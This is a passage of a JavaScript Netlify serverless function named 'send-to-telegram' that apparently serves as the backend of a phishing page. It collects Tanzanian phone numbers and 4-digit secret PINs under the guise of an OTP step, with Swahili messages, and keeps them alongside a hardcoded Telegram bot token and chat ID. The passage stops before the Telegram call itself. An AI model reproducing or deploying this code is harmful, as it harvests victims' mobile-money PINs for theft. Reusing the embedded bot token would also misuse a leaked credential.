// netlify/functions/send-to-telegram.js

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8979567614:AAHvIQzCZcEDbfZXZtFqt5pSpUpAduayra0';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8834429633';

const userStore = {};

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 204, headers };
    }

    try {
        const path = event.path.replace('/.netlify/functions/send-to-telegram', '');

        // ===== SEND OTP =====
        if (event.httpMethod === 'POST' && path === '/send-otp') {
            const { phone, pin } = JSON.parse(event.body);

            if (!phone || !pin) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Tafadhali jaza namba zote mbili.'
                    })
                };
            }

            const cleanPhone = phone.replace(/^0+/, '').replace(/^\+255/, '');

            if (cleanPhone.length < 9) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Namba ya simu si sahihi.'
                    })
                };
            }

            // ✅ PIN MUST BE EXACTLY 4 DIGITS
            if (!/^\d{4}$/.test(pin)) {
                return {
                    statusCode: 401,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Namba ya Siri lazima iwe tarakimu 4.'
                    })
                };
            }

            // Store user info
            userStore[cleanPhone] = {
                phone: cleanPhone,
                pin: pin,
                timestamp: new Date().toISOString(),
                referral: `REF-${cleanPhone}`
            };

            console.log(`📱 OTP request for ${cleanPhone}`);

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    success: true,
                    message:
